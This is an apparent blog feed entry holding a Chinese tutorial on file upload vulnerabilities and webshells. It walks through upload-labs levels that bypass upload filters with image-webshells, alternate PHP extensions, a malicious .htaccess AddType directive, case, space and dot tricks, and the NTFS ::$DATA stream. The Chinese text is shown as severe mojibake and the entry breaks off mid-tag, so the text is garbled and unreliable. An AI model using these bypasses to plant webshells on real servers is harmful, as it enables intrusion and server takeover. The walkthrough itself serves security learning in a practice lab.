      <link href="/2019/12/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E3%80%81%E9%AA%8C%E8%AF%81%E3%80%81%E4%BC%AA%E9%80%A0/"/>
      <url>/2019/12/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E3%80%81%E9%AA%8C%E8%AF%81%E3%80%81%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼š"><a href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼š" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼š"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼š</h1><p>æ–‡ä»¶ä¸Šä¼ æ¼æ´æ˜¯æŒ‡ç½‘ç»œæ”»å‡»è€…ä¸Šä¼ äº†ä¸€ä¸ªå¯æ‰§è¡Œçš„æ–‡ä»¶åˆ°æœåŠ¡å™¨å¹¶æ‰§è¡Œã€‚è¿™é‡Œä¸Šä¼ çš„æ–‡ä»¶å¯ä»¥æ˜¯æœ¨é©¬ï¼Œç—…æ¯’ï¼Œæ¶æ„è„šæœ¬æˆ–è€…WebShellç­‰ã€‚è¿™ç§æ”»å‡»æ–¹å¼æ˜¯æœ€ä¸ºç›´æ¥å’Œæœ‰æ•ˆçš„ï¼Œéƒ¨åˆ†æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„åˆ©ç”¨æŠ€æœ¯é—¨æ§›éå¸¸çš„ä½ï¼Œå¯¹äºæ”»å‡»è€…æ¥è¯´å¾ˆå®¹æ˜“å®æ–½ã€‚</p><p>æ–‡ä»¶ä¸Šä¼ æ¼æ´æœ¬èº«å°±æ˜¯ä¸€ä¸ªå±å®³å·¨å¤§çš„æ¼æ´ï¼ŒWebShellæ›´æ˜¯å°†è¿™ç§æ¼æ´çš„åˆ©ç”¨æ— é™æ‰©å¤§ã€‚å¤§å¤šæ•°çš„ä¸Šä¼ æ¼æ´è¢«åˆ©ç”¨åæ”»å‡»è€…éƒ½ä¼šç•™ä¸‹WebShellä»¥æ–¹ä¾¿åç»­è¿›å…¥ç³»ç»Ÿã€‚æ”»å‡»è€…åœ¨å—å½±å“ç³»ç»Ÿæ”¾ç½®æˆ–è€…æ’å…¥WebShellåï¼Œå¯é€šè¿‡è¯¥WebShellæ›´è½»æ¾ï¼Œæ›´éšè”½çš„åœ¨æœåŠ¡ä¸­ä¸ºæ‰€æ¬²ä¸ºã€‚</p><p>è¿™é‡Œéœ€è¦ç‰¹åˆ«è¯´æ˜çš„æ˜¯ä¸Šä¼ æ¼æ´çš„åˆ©ç”¨ç»å¸¸ä¼šä½¿ç”¨WebShellï¼Œè€ŒWebShellçš„æ¤å…¥è¿œä¸æ­¢æ–‡ä»¶ä¸Šä¼ è¿™ä¸€ç§æ–¹å¼ã€‚</p><h1 id="webshellï¼š"><a href="#webshellï¼š" class="headerlink" title="webshellï¼š"></a>webshellï¼š</h1><p>WebShellå°±æ˜¯ä»¥aspã€phpã€jspæˆ–è€…cgiç­‰ç½‘é¡µæ–‡ä»¶å½¢å¼å­˜åœ¨çš„ä¸€ç§å‘½ä»¤æ‰§è¡Œç¯å¢ƒï¼Œä¹Ÿå¯ä»¥å°†å…¶ç§°ä¹‹ä¸ºä¸€ç§ç½‘é¡µåé—¨ã€‚æ”»å‡»è€…åœ¨å…¥ä¾µäº†ä¸€ä¸ªç½‘ç«™åï¼Œé€šå¸¸ä¼šå°†è¿™äº›aspæˆ–phpåé—¨æ–‡ä»¶ä¸ç½‘ç«™æœåŠ¡å™¨webç›®å½•ä¸‹æ­£å¸¸çš„ç½‘é¡µæ–‡ä»¶æ··åœ¨ä¸€èµ·ï¼Œç„¶åä½¿ç”¨æµè§ˆå™¨æ¥è®¿é—®è¿™äº›åé—¨ï¼Œå¾—åˆ°ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œç¯å¢ƒï¼Œä»¥è¾¾åˆ°æ§åˆ¶ç½‘ç«™æœåŠ¡å™¨çš„ç›®çš„ï¼ˆå¯ä»¥ä¸Šä¼ ä¸‹è½½æˆ–è€…ä¿®æ”¹æ–‡ä»¶ï¼Œæ“ä½œæ•°æ®åº“ï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤ç­‰ï¼‰ã€‚</p><h1 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„åŸå› ï¼š"><a href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„åŸå› ï¼š" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„åŸå› ï¼š"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„åŸå› ï¼š</h1><ul><li>æ–‡ä»¶ä¸Šä¼ æ—¶æ£€æŸ¥ä¸ä¸¥ã€‚æ²¡æœ‰è¿›è¡Œæ–‡ä»¶æ ¼å¼æ£€æŸ¥ã€‚</li><li>æ–‡ä»¶ä¸Šä¼ åä¿®æ”¹æ–‡ä»¶åæ—¶å¤„ç†ä¸å½“ã€‚ä¸€äº›åº”ç”¨åœ¨æœåŠ¡å™¨ç«¯è¿›è¡Œäº†å®Œæ•´çš„é»‘åå•å’Œç™½åå•è¿‡æ»¤ï¼Œåœ¨ä¿®æ”¹å·²ä¸Šä¼ æ–‡ä»¶æ–‡ä»¶åæ—¶å´ç™¾å¯†ä¸€ç–ï¼Œå…è®¸ç”¨æˆ·ä¿®æ”¹æ–‡ä»¶åç¼€ã€‚å¦‚åº”ç”¨åªèƒ½ä¸Šä¼ .docæ–‡ä»¶æ—¶æ”»å‡»è€…å¯ä»¥å…ˆå°†.phpæ–‡ä»¶åç¼€ä¿®æ”¹ä¸º.docï¼ŒæˆåŠŸä¸Šä¼ ååœ¨ä¿®æ”¹æ–‡ä»¶åæ—¶å°†åç¼€æ”¹å›.phpã€‚</li></ul><h1 id="æ–‡ä»¶ä¸Šä¼ å¸¸è§æ£€æµ‹ï¼š"><a href="#æ–‡ä»¶ä¸Šä¼ å¸¸è§æ£€æµ‹ï¼š" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ å¸¸è§æ£€æµ‹ï¼š"></a>æ–‡ä»¶ä¸Šä¼ å¸¸è§æ£€æµ‹ï¼š</h1><h3 id="1-å®¢æˆ·ç«¯æ£€æµ‹"><a href="#1-å®¢æˆ·ç«¯æ£€æµ‹" class="headerlink" title="1.å®¢æˆ·ç«¯æ£€æµ‹"></a>1.å®¢æˆ·ç«¯æ£€æµ‹</h3><p>ä¸€èˆ¬éƒ½æ˜¯åœ¨ç½‘é¡µä¸Šå†™ä¸€æ®µjsè„šæœ¬ï¼Œé€šè¿‡jså»æ£€æµ‹ä¸Šä¼ æ–‡ä»¶çš„åç¼€åï¼Œæœ‰ç™½åå•å½¢å¼ä¹Ÿæœ‰é»‘åå•å½¢å¼ã€‚</p><p><strong>åˆ¤æ–­æ–¹å¼</strong>ï¼šåœ¨æµè§ˆåŠ è½½æ–‡ä»¶ï¼Œä½†è¿˜æœªç‚¹å‡»ä¸Šä¼ æŒ‰é’®æ—¶ä¾¿å¼¹å‡ºå¯¹è¯æ¡†ï¼Œå†…å®¹å¦‚ï¼šåªå…è®¸ä¸Šä¼ .jpg/.jpeg/.pngåç¼€åçš„æ–‡ä»¶ï¼Œè€Œæ­¤æ—¶å¹¶æ²¡æœ‰å‘é€æ•°æ®åŒ…ã€‚å‰ç«¯éªŒè¯éå¸¸ä¸å¯é ï¼Œé€šè¿‡ä¿®æ”¹æ•°æ®åŒ…åç¼€åå°±å¯ä»¥ç»•è¿‡ï¼Œç”šè‡³å…³é—­jséƒ½å¯ä»¥å°è¯•ç»•è¿‡ã€‚</p><h3 id="2-æœåŠ¡ç«¯æ£€æµ‹"><a href="#2-æœåŠ¡ç«¯æ£€æµ‹" class="headerlink" title="2.æœåŠ¡ç«¯æ£€æµ‹"></a>2.æœåŠ¡ç«¯æ£€æµ‹</h3><p>æ£€æŸ¥content-type(å†…å®¹ç±»å‹)</p><p>æ£€æŸ¥åç¼€(å¤šä¸ºæ£€æŸ¥åç¼€)</p><p>æ£€æŸ¥æ–‡ä»¶å¤´</p><h1 id="é¶åœºå®æˆ˜"><a href="#é¶åœºå®æˆ˜" class="headerlink" title="é¶åœºå®æˆ˜"></a>é¶åœºå®æˆ˜</h1><p><strong>æˆ‘ä»¬é€šè¿‡upload-labsè¿™ä¸ªé¶åœºå®è·µæ¥è¿›ä¸€æ­¥è®¤è¯†æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼š</strong></p><h2 id="1-å‰ç«¯éªŒè¯ç»•è¿‡"><a href="#1-å‰ç«¯éªŒè¯ç»•è¿‡" class="headerlink" title="1.å‰ç«¯éªŒè¯ç»•è¿‡"></a>1.å‰ç«¯éªŒè¯ç»•è¿‡</h2><p>å‘ç°æœ‰ä¸€ä¸ªä¸Šä¼ ç‚¹:<br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/3Mmx5VPtCeDOVajrGQdlsIyRqbXkdDVByTBpXwvgJdA!/b/dE8BAAAAAAAA&amp;bo=JAWAAn4HpQMDCVA!&amp;rf=viewer_4" alt></p><p>æˆ‘ä»¬è¯•ç€ä¸Šä¼ ä¸€ä¸ªå¸¦ä¸€å¥è¯çš„phpä¸Šå»ï¼Œå¹¶å¼€å¯burpæŠ“åŒ…ï¼š<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/l.JY9E.mj4AfwMwYb5Dctfcfw9EOUQbMT0Z.zi4J4go!/b/dL8AAAAAAAAA&amp;bo=ZQaAAnwGiQIDGSw!&amp;rf=viewer_4" alt><br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/uTXBzs2Ps5cWXXSqyuT6tJycypL.Z6kJ*kCngBftG6s!/b/dDUBAAAAAAAA&amp;bo=8ATgA*AE4AMDGTw!&amp;rf=viewer_4" alt><br>å‘ç°è¢«æ‹¦æˆªä¸‹æ¥ï¼Œæç¤ºåªèƒ½ä¸Šä¼ å›¾ç‰‡ç±»å‹ï¼Œè€Œåœ¨burpä¸Šå¹¶æ— æŠ“å–åˆ°ä»»ä½•æ•°æ®ï¼Œè¿™è¯æ˜å°±æ˜¯ä¸€ä¸ªå…¸å‹çš„å®¢æˆ·ç«¯å‰ç«¯æ£€æµ‹</p><p>æˆ‘ä»¬é€šè¿‡å°†phpæ–‡ä»¶æ”¹æˆjpgæ–‡ä»¶ä½¿å…¶ç¬¦åˆæ£€æµ‹è¦æ±‚ï¼Œå†åœ¨æŠ“å–æ•°æ®åŒ…æ—¶å°†æ–‡ä»¶åç¼€æ”¹å›phpï¼Œä»è€Œå®Œæˆç»•è¿‡ï¼š<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/TTZRCftxc3JNuulzU7WceTsyeEqqCQOokzNoepwq*XA!/b/dL4AAAAAAAAA&amp;bo=8ATgA*AE4AMDGTw!&amp;rf=viewer_4" alt></p><p>å‘ç°æˆåŠŸä¸Šä¼ <br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/*EDL2ABep5jCTnuEtx3hbs3zd7SZRFPJR3GKoldj5xc!/b/dLYAAAAAAAAA&amp;bo=gAcyAoAHMgIDGTw!&amp;rf=viewer_4" alt></p><p>é€šè¿‡è¿æ¥èœåˆ€æˆ–ç›´æ¥è°ƒç”¨ä¸€å¥è¯å‡½æ•°éƒ½å¯ä»¥å®ç°äº†getshellï¼›<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/4TFYbPyRNP5*fBz2AFQw*IZxJcvcViw.uVEx9OrYYt8!/b/dIMAAAAAAAAA&amp;bo=XQfVA10H1QMDGTw!&amp;rf=viewer_4" alt></p><h2 id="2-Content-Typeæ–¹å¼ç»•è¿‡"><a href="#2-Content-Typeæ–¹å¼ç»•è¿‡" class="headerlink" title="2.Content-Typeæ–¹å¼ç»•è¿‡"></a>2.Content-Typeæ–¹å¼ç»•è¿‡</h2><p>åˆ†ææºç ï¼ŒçŸ¥é“äº†æ˜¯å¯¹Content-Type(å†…å®¹ç±»å‹)å’Œæ–‡ä»¶å¤´çš„æ£€æµ‹ï¼Œ<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/k7Q*x9fqgWz5dGtJqOsWKzPvTT0idkTpvc1k9nKHPLs!/b/dLgAAAAAAAAA&amp;bo=BgWAAmUHrgMRGWA!&amp;rf=viewer_4" alt></p><p>é‚£æˆ‘ä»¬æƒ³åˆ°çš„æ˜¯å°±æ˜¯å›¾ç‰‡é©¬ï¼Œå›¾ç‰‡é©¬æ˜¯å¯ä»¥å¾ˆå¥½çš„ç»•è¿‡å†…å®¹ç±»å‹å’Œæ–‡ä»¶å¤´æ£€æµ‹çš„ï¼Œåœ¨è¿™é‡Œæˆ‘å‡†å¤‡å¥½äº†ä¸€ä¸ªå†™äº†ä¸€å¥è¯çš„txtæ–‡ä»¶å’Œä¸€å¼ å°å›¾ç‰‡æ¥åˆæˆä¸€å¼ å›¾ç‰‡é©¬ï¼š<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/gz4TwdZE01nQdK7U6tdbyqa9xidrPgWSev6j8jC5.jM!/b/dFMBAAAAAAAA&amp;bo=zADaAMwA2gARGS4!&amp;rf=viewer_4" alt><br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/OJ0mpZH4z1GBmvVyPYgtUiengE6r*78DPKn.ynq4WTc!/b/dMUAAAAAAAAA&amp;bo=nQI*AZ0CPwERGS4!&amp;rf=viewer_4" alt><br>æˆåŠŸç”Ÿæˆå›¾ç‰‡é©¬ï¼Œç„¶åæˆ‘ä»¬å°†å›¾ç‰‡é©¬ä¸Šä¼ å¹¶æŠ“åŒ…å°†åç¼€æ”¹ä¸ºphpï¼Œå› ä¸ºwebå®¹å™¨æ˜¯æ ¹æ®åç¼€å»è§£æä¸åŒçš„æ–‡ä»¶çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†ä»–æ”¹æˆphp<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/dUa5qe571hvX4y8kSTfD*rEs.jxaziSx8mmE0Yo.9sI!/b/dIQAAAAAAAAA&amp;bo=8ATgA*AE4AMRGS4!&amp;rf=viewer_4" alt><br>æœ€åæˆåŠŸä¸Šä¼ ï¼Œå¹¶è°ƒç”¨ä¸€å¥è¯<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/8Temr59hWbfKnh6OUyr0dRh3UCato6TZFcWnUChSbHM!/b/dL8AAAAAAAAA&amp;bo=MQWAAmgHkQMRGWU!&amp;rf=viewer_4" alt><br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/ZO3Z5LqU7MPUKOuIRhqiYTwnCmkpNEaHxm1U*T3d1.o!/b/dDQBAAAAAAAA&amp;bo=dAfXA3QH1wMRCT4!&amp;rf=viewer_4" alt></p><h2 id="3-é»‘åå•ç»•è¿‡"><a href="#3-é»‘åå•ç»•è¿‡" class="headerlink" title="3.é»‘åå•ç»•è¿‡"></a>3.é»‘åå•ç»•è¿‡</h2><p>æŸ¥çœ‹æºç <br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/Nb6czO9WTB4*L6e6mQuqQ7Agi.ex2aNHMb*tv6W2SgM!/b/dLYAAAAAAAAA&amp;bo=ZQW9AmUFvQIRCT4!&amp;rf=viewer_4" alt><br>å‘ç°æ˜¯ä¸€ä¸ªé»‘åå•ç»•è¿‡ï¼Œå®ƒæ‹¦æˆªäº†.asp,.aspx,.php,.jspåç¼€çš„æ–‡ä»¶ï¼Œä½†ä»–æ‹¦æˆªäº†phpï¼Œæ˜¯ä¸æ˜¯å°±æ„å‘³ç€æˆ‘ä»¬å°±ä¸èƒ½ä¸Šä¼ phpæ–‡ä»¶äº†å‘¢ï¼Ÿå…¶å®ä¸æ˜¯çš„ï¼Œåœ¨é»˜è®¤çŠ¶æ€ä¸‹<strong>phpï¼Œphp3ï¼Œphp4ï¼Œphp5ï¼Œphtml</strong>æ˜¯ä¼šè¢«è§£ææˆphpçš„ï¼Œè¯·çœ‹ä¸‹å›¾<br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/ekwZbyk2edL5EupB09P8Jmdsc2QvPzfargMfRfWj03U!/b/dMAAAAAAAAAA&amp;bo=LgGkAC4BpAARCT4!&amp;rf=viewer_4" alt><br>æˆ‘ä»¬å°†å›¾ç‰‡é©¬åç¼€æ”¹æˆphp3ï¼ŒæˆåŠŸå°†ä¸Šä¼ ï¼Œè°ƒç”¨ä¸€å¥è¯ï¼Œæœ€åæˆåŠŸè°ƒç”¨ï¼Œè¯æ˜æ˜¯å¯ä»¥php3æ˜¯å¯ä»¥è¢«phpè§£æçš„ï¼›<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/ER3vfEB2o6Cz20fHXHQSnQVYaezJOBDlDhVPMMSlH4o!/b/dL8AAAAAAAAA&amp;bo=ewfSA3sH0gMRGS4!&amp;rf=viewer_4" alt></p><h2 id="4-htaccessæ–‡ä»¶ç»•è¿‡"><a href="#4-htaccessæ–‡ä»¶ç»•è¿‡" class="headerlink" title="4. .htaccessæ–‡ä»¶ç»•è¿‡"></a>4. .htaccessæ–‡ä»¶ç»•è¿‡</h2><p><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/mEWjMDZU2Q7YDuklJEEfcKIcukqlBjU8U*FNNsBltTw!/b/dDIBAAAAAAAA&amp;bo=VAXJAlQFyQIRGS4!&amp;rf=viewer_4" alt><br>.htaccessæ˜¯ä»€ä¹ˆï¼Ÿ.htaccessæ–‡ä»¶ä¹Ÿè¢«ç§°ä¸ºåˆ†å¸ƒå¼é…ç½®æ–‡ä»¶ï¼Œæä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–è€…å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚<br>.htaccessåŠŸèƒ½ï¼š<br>æ–‡ä»¶å¯†ç ä¿æŠ¤ï¼Œç”¨æˆ·è‡ªå®šä¹‰é‡å®šå‘ï¼Œè‡ªå®šä¹‰404é¡µé¢ï¼Œæ‰©å±•åä¼ªé™æ€åŒ–ï¼Œç¦æ­¢ç‰¹å®šipåœ°å€çš„ç”¨æˆ·ï¼Œä½†è¿™ä¸ªåŠŸèƒ½é»˜è®¤æ˜¯ä¸å¼€å¯çš„ã€‚</p><p>.htaccessä¸­æœ‰ä¸€æ¡æŒ‡ä»¤:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæŒ‡ä»¤ä»£è¡¨ç€.jpgæ–‡ä»¶ä¼šå½“åšphpæ¥è§£æã€‚</p><p>åªè¦æˆ‘ä»¬æŠŠå¸¦æœ‰è¿™æ¡æŒ‡ä»¤çš„.htaccessé…ç½®æ–‡ä»¶ä¸Šä¼ ä¸Šå»åˆ°æœ‰é»‘åå•æ‹¦æˆªçš„ä¸Šä¼ ç‚¹ï¼Œé‚£å°±æ„å‘³ç€æˆ‘ä»¬å°±èƒ½å°†å›¾ç‰‡é©¬ç›´æ¥ä¸Šä¼ ä¸Šå»äº†ï¼</p><p>å›¾å½¢åŒ–ç•Œé¢æ˜¯ä¸å…è®¸æˆ‘ä»¬å°†æ–‡ä»¶å‘½åä¸ºç©ºæ–‡ä»¶å .htaccessï¼Œæ‰€ä»¥è¿™é‡Œé€šè¿‡cmdå‘½ä»¤æ¥è¿›è¡Œé‡å‘½åï¼š<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/*Z8xWXTZLwkgcga9IhymWx*oWoG6MnmR9M.DajlIFl8!/b/dE0BAAAAAAAA&amp;bo=WwTQAlsE0AIRGS4!&amp;rf=viewer_4" alt><br>æˆåŠŸå‘½åï¼Œ<br>æˆ‘ä»¬æ¥ä¸‹æ¥ï¼Œåªéœ€è¦å…ˆå°†.htaccessé…ç½®æ–‡ä»¶å…ˆä¼ ä¸Šå»ï¼Œåœ¨å°†å›¾ç‰‡é©¬ä¼ ä¸Šå»å³å¯ï¼›<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/QjmHLIRy7nOP*i6x2BoPnYS58mG3WipMkEMJnsztUyk!/b/dLYAAAAAAAAA&amp;bo=gAfcA4AH3AMRGS4!&amp;rf=viewer_4" alt></p><h2 id="5-åç¼€å¤§å°å†™ç»•è¿‡"><a href="#5-åç¼€å¤§å°å†™ç»•è¿‡" class="headerlink" title="5.åç¼€å¤§å°å†™ç»•è¿‡"></a>5.åç¼€å¤§å°å†™ç»•è¿‡</h2><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/NsiHDYDfN.Hj.9yD1bRwXVg.UMyHnH6x.WU0p0PPKtY!/b/dFMBAAAAAAAA&amp;bo=YAXIAmAFyAIRCT4!&amp;rf=viewer_4" alt></p><p>åœ¨è¿™é‡Œï¼Œè™½ç„¶ä½¿ç”¨äº†å¾ˆå¤šè¿‡æ»¤ï¼Œè¿‡æ»¤äº†å¾ˆå¤šæ–‡ä»¶ç±»å‹ï¼Œä½†å´æ²¡å°†æ–‡ä»¶åç¼€ç»Ÿä¸€è½¬åŒ–ä¸ºå°å†™ï¼Œæ‰€ä»¥æˆ‘ä»¬æ˜¯èƒ½é€šè¿‡åç¼€å¤§å°å†™æ¥ç»•è¿‡ä¸Šä¼ çš„ï¼š</p><p><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/yOlNuyZEw.zicCi8Edmbs5BKc1fH.HnwoPjmqQwes4Q!/b/dFMBAAAAAAAA&amp;bo=ZwCCAGcAggARGS4!&amp;rf=viewer_4" alt></p><p>æˆ‘ä»¬å°†åšæˆå›¾ç‰‡é©¬ç›´æ¥å°†åç¼€æ”¹æˆPhpï¼Œè¿›è¡Œä¸Šä¼ <br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/kvso.KNy1R2IDA9JC.lM4CZqaR4Py5qhwuvutwnx8ME!/b/dE8BAAAAAAAA&amp;bo=gAfZA4AH2QMRGS4!&amp;rf=viewer_4" alt></p><h2 id="6-æ–‡ä»¶åç¼€ï¼ˆç©ºï¼‰ç»•è¿‡"><a href="#6-æ–‡ä»¶åç¼€ï¼ˆç©ºï¼‰ç»•è¿‡" class="headerlink" title="6.æ–‡ä»¶åç¼€ï¼ˆç©ºï¼‰ç»•è¿‡"></a>6.æ–‡ä»¶åç¼€ï¼ˆç©ºï¼‰ç»•è¿‡</h2><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/ctpzNLW1hvfPIv.T4z0Dkrsak5SyY67FtTJu8nlEkzQ!/b/dDQBAAAAAAAA&amp;bo=ZwXFAmcFxQIRCT4!&amp;rf=viewer_4" alt></p><p>è¿™é‡Œç›¸å¯¹äºå‰é¢å…³å¡çš„ä»£ç æ˜¯å°‘äº†ä¸€ä¸ªæ¶ˆé™¤ä¸¤æ—ç©ºæ ¼çš„å‡½æ•°trim();æ‰€ä»¥æˆ‘ä»¬æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨åç¼€åŠ ä¸ªç©ºæ ¼å°è¯•ç»•è¿‡ï¼Œ<strong>é»‘åå•æœºåˆ¶ä¸­ï¼Œæ˜¯ä¸å…è®¸ä¸Šä¼ ä»€ä¹ˆï¼Œä½†å¦‚æœæˆ‘ä»¬ä¼ ä¸Šå»çš„æ–‡ä»¶ä¸æ‰€é™åˆ¶çš„ç¨æœ‰ä¸ä¸€æ ·ï¼Œé‚£æ˜¯ä¸æ˜¯å°±å¯ä»¥ç›´æ¥ç»•è¿‡é»‘åå•äº†</strong></p><p>æˆ‘ä»¬è¿›è¡Œå°†å¸¦æœ‰ä¸€å¥è¯çš„phpæ–‡ä»¶ä¸Šä¼ å¹¶æŠ“åŒ…</p><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/d*pCj2unPGzQ7rMhKzo8QEfPa7tBLtExl229Qs*79HE!/b/dL4AAAAAAAAA&amp;bo=8ATgA*AE4AMRCT4!&amp;rf=viewer_4" alt></p><p>åœ¨åç¼€åŠ ä¸ªç©ºæ ¼ï¼Œä¸Šä¼ </p><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/kvso.KNy1R2IDA9JC.lM4CZqaR4Py5qhwuvutwnx8ME!/b/dE8BAAAAAAAA&amp;bo=gAfZA4AH2QMRCT4!&amp;rf=viewer_4" alt></p><h2 id="7-æ–‡ä»¶åç¼€-ç‚¹-ç»•è¿‡"><a href="#7-æ–‡ä»¶åç¼€-ç‚¹-ç»•è¿‡" class="headerlink" title="7.æ–‡ä»¶åç¼€(ç‚¹)ç»•è¿‡"></a>7.æ–‡ä»¶åç¼€(ç‚¹)ç»•è¿‡</h2><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/m1IqTO83xMSNLK8m2qvEU8CwZUTsqPY3GoAIPB1aFdY!/b/dL8AAAAAAAAA&amp;bo=CQWAAmAFqwIRCXw!&amp;rf=viewer_4" alt><br>è¿™é‡Œæ˜¯å°‘äº†ä¸€ä¸ªåˆ é™¤æœ«å°¾çš„ç‚¹çš„å‡½æ•°</p><p>æˆ‘ä»¬è¿˜æ˜¯è¿›è¡Œå°†å¸¦æœ‰ä¸€å¥è¯çš„phpæ–‡ä»¶ä¸Šä¼ å¹¶æŠ“åŒ…</p><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/qiENQR89aUzEeuVUhohrosTDte9YlnwFnZr1bGrfjko!/b/dL8AAAAAAAAA&amp;bo=8ATgA*AE4AMRCT4!&amp;rf=viewer_4" alt><br>åœ¨åç¼€åŠ ä¸ªç‚¹ï¼Œä¸Šä¼ ï¼Œåœ¨ä¸Šä¼ åˆ°æœåŠ¡å™¨åï¼ŒæœåŠ¡å™¨ä¼šè‡ªåŠ¨å°†ç‚¹å»æ‰ï¼Œåªè¯»å–å‰é¢æœ‰ç”¨çš„åç¼€ï¼›<br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/synsgTwLVgNk6k9.rkhjouhz5iuujzkRNdYZALQkaCg!/b/dDcBAAAAAAAA&amp;bo=gAfbA4AH2wMRCT4!&amp;rf=viewer_4" alt></p><h2 id="8-DATAï¼ˆWindowsæ–‡ä»¶æµç»•è¿‡ï¼‰"><a href="#8-DATAï¼ˆWindowsæ–‡ä»¶æµç»•è¿‡ï¼‰" class="headerlink" title="8.::$DATAï¼ˆWindowsæ–‡ä»¶æµç»•è¿‡ï¼‰"></a>8.::$DATAï¼ˆWindowsæ–‡ä»¶æµç»•è¿‡ï¼‰</h2><p>::$DATAï¼ˆWindowsæ–‡ä»¶æµç»•è¿‡ï¼‰ï¼ˆè¿™é‡Œåˆ©ç”¨åˆ°äº†NTFSäº¤æ¢æ•°æ®æµ(ADS)ï¼ŒADSæ˜¯NTFSç£ç›˜æ ¼å¼çš„ä¸€ä¸ªç‰¹æ€§ï¼Œåœ¨NTFSæ–‡ä»¶ç³»ç»Ÿä¸‹ï¼Œæ¯ä¸ªæ–‡ä»¶éƒ½å­˜åœ¨è®¸å¤šä¸ªæ•°æ®æµã€‚é€šä¿—ç†è§£ï¼Œå°±æ˜¯å…¶ä»–æ–‡ä»¶å¯ä»¥â€œå¯„å®¿â€åœ¨æŸä¸ªæ–‡ä»¶èº«ä¸Šï¼Œè€Œåœ¨èµ„æºç®¡ç†å™¨ä¸­å´åªèƒ½çœ‹åˆ°å®¿ä¸»æ–‡ä»¶ï¼Œæ‰¾ä¸åˆ°å¯„å®¿é—®æ–‡ä»¶ã€‚ï¼‰</p><p>ä¾‹å¦‚åœ¨cmdå‘½ä»¤ä¸‹è¿è¡Œï¼šecho abcd&gt;&gt;a.txt:b.txt å¾ˆæ˜æ˜¾ç”Ÿæˆä¸€ä¸ªa.txtï¼Œä½†æ˜¯ä¼šæ˜¯ç©ºå€¼ï¼Œå› ä¸ºç³»ç»Ÿå°†å€¼å†™åˆ°å¯„å®¿æ–‡ä»¶ä¸Šå»äº†ï¼›</p><p>ç„¶åå†è¿è¡Œ echo 123&gt;&gt;a.txt::$DATAï¼Œæ˜¯ä¼šåœ¨a.txtä¸­è¾“å‡º123çš„ï¼Œå› ä¸º<br>::$DATAç›¸å½“æ˜¯ä¸ªç©ºå€¼ï¼Œä¸æ˜¯ä¸€ä¸ªå¯„å®¿æ–‡ä»¶ï¼Œæ‰€ä»¥è¿˜æ˜¯ä¼šå°†æ–‡ä»¶å†™å…¥åˆ°a.txtä¸­å»ï¼Œä¸ä¿®æ”¹æ–‡ä»¶å­˜å‚¨è¿‡ç¨‹ï¼›</p><p>åœ¨åˆ©ç”¨Windowsç‰¹æ€§ï¼Œå¯åœ¨åç¼€åŠ ä¸Šâ€œ ::$DATA â€ç»•è¿‡ã€‚<br>è·Ÿä¹‹å‰ä¸€æ ·çš„æ€è·¯ï¼ŒæŠ“åŒ…æ”¹åŒ…ç»•è¿‡ã€‚<br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/ZxgolmKjvTPXMgVANvNagukSCz3aQqzZw.zzqXbcpS4!/b/dEgBAAAAAAAA&amp;bo=8ATgA*AE4AMRCT4!&amp;rf=viewer_4" alt></p><p><img 